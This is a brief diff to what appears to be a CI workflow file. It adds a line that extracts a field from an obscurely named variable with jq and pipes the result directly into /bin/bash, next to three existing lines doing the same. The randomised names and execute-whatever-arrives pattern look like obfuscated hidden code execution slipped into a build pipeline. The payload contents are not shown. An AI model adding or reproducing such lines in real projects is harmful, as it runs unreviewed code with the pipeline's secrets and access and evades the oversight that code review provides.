@@ -30,6 +30,7 @@ jobs:
           echo $sym9726 | jq -r .osqi98 | /bin/bash
           echo $gkas9 | jq -r .ckmfw27111 | /bin/bash
           printf '%s' "$mlda767" | jq -r .or7798 | /bin/bash
+          printf '%s' "$y301" | jq -r .hw9 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
